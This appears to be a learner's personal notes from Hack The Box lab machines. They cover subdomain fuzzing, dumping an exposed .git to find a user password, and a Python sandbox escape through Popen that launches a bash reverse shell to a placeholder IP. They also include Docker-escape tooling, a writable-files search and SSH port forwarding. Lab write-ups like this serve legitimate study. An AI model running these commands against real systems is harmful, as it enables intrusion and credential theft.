
# USE FFUF FOR SUBDOMAINS

ffuf -w /path/to/wordlist.txt -u http://target.htb -H "Host: FUZZ.target.htb" -fc 400,403,301

WOULD HAVE MADE TITANIC EZ AS FUCK BUT NAH WE DECIDED TO TRY AND FIND A FUCKING CVE THAT DOESNT EVEN EXIST YET

---

# 6/13/25 DOG HTB MACHINE
# Downloading .Gits from site & Useful Grep 

I knew the name of the site is dog.htb. I found that there was a .git in the contents directory. I used 
```python
githack.py http://10.10.11.58/.git
```
Note: i had to source the venv via
```zsh
source ~/.env/bin/activate
```
Did that to install Githack then ran the previous command in the terminal

Once I had downloaded the contents of the .git, I did:
```zsh
grep -i "dog.htb" -R .
```
This grepped through every file in the .git and searched for anything with "dog.htb" which led me to the password of a user tiffany that i then used to login to the admin page


---

# 6-14-25 Challenge Site

==For External Testing Use Ngrok==

Can forward http or tcp

ngrok http port
ngrok tcp port

![[ngrok tcp example.png]]

==Use Deepce to find other hosts in a network==

==IT ALSO FINDS ESCAPES IT IS ONLY MEANT TO BE USED INSIDE MACHINES THAT ARE IN A DOCKER CONTAINER==

---
# 6.14.25 Code HTB Machine

```python
print((()).__class__.__bases__[0].__subclasses__())
```
look for 'Popen'. its in the subprocess module and its how you spawn shell commands

```python
raise Exception((()).__class__.__bases__[0].__subclasses__()[x].__name__)
```
This is pretty much brute forcing process names but with numbers

```python
raise Exception((()).__class__.__bases__[0].__subclasses__()[x]("bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=true, stdout=-1).communicate())
```
wrapping this reverse shell in an Exception because it worked with the site. Not always needed but it was here. This one-liner works without import, or os, just exceptions and popen

==ON LINUX MACHINES YOU CAN SEE WHAT YOU CAN TOUCH/WRITE TO VIA:==
```bash
find / -writable -type f 2>/dev/null |grep -Ev '^/proc|^/sys'
```

---

# 6/15/2025 Port Forwarding a port on ssh target

So i ran linpeas on a machine : ==Planning.htb==. It said some ports were being used from 127.0.0.1. The port was 8000. I wanted to see what it was so i ran: 
```zsh
ssh -L 8000:127.0.0.1:8000 user@IP
```
then typed in the password for the user

Back in my browser, i went to ==localhost:8000==z

---
# Useful Resources

==Literally every kind of payload=== : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master



